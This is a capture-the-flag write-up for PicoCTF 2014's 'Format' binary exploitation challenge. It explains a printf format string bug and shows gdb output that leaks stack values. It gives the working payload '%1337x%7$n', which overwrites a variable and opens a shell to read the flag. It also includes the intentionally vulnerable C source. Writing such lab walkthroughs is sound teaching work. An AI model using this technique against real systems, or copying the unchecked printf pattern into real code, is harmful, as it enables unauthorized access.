# Pico-CTF 2014: Format

**Category:** Binary Exploitation
**Points:** 70
**Total Solves:** Not Available
## Problem Description:

> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found [here](format.c).

```
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int secret = 0;

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

int main(int argc, char **argv){
    int *ptr = &secret;
    printf(argv[1]);

    if (secret == 1337){
        give_shell();
    }
    return 0;
}
```

## Write-up

> This program has format string vulnerability at line `printf(argv[1]);`. If we give format specifiers as a input, then while printing printf will start popping up the varaible, of type specified in format string, from stack. We can also write at specified location with printf with `%n` specifier. Suppose if we give %d as input then printf will print a integer from stack. Using this exploit we can pop out the value of variable `secret`. 
To print multiple integers form stack we can use give format string as %$1d, it will print the 1st integer from stack. We can give input as `%1$d,%2$d,%3$d,%4$d,%5$d,%6$d` and printf will print 6 integers from stack.

> To get the shell we need to write 1337 at the address of variable secret. First we need the address of secret which is stored in `int *ptr`. 

```c
pico74093@shell:/home/format$ gdb ./format
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./format...(no debugging symbols found)...done.
(gdb) p &secret
$1 = (<data variable, no debug info> *) 0x804a030 <secret>
```

> Now we know the address of variable secret which is 0x804a030. We need to write 1337 to this address in  order to be able to get shell.
> To write at this address we can use %n specifier but we need to specify the address 0x804a030 to printf that this is the location where we want to write. To gets its location on stack we can use gdb:

```bash
(gdb) r "%p %p %p %p %p %p %p %p %p %p %p %p"
Starting program: /home/format/format "%p %p %p %p %p %p %p %p %p %p %p %p"
0xffffd764 0xffffd770 0xf7e5242d 0xf7fc93c4 0xf7ffd000 0x804852b 0x804a030 0x8048520 (nil) (nil) 0xf7e38a83 0x2[Inferior 1 (process 18944) exited normally]
```

> We can see that address is located at 7th position in the pointers available at stack. We can specify it using `%$7n`.

> Using this we create our standard format string : `%1337x%$7n`. To get better understanding of format string exploits read [here](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html). While executing we need to pass `%1337x%7\$n` because otherwise shell will treat $n as varaible.

```bash
pico74093@shell:/home/format$ ./format "%1337x%7\$n"
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $ ls
flag.txt  format  format.c  Makefile
$ cat flag.txt
who_thought_%n_was_a_good_idea?
```

> Flag is : **who_thought_%n_was_a_good_idea?**

## Other write-ups and resources

* None
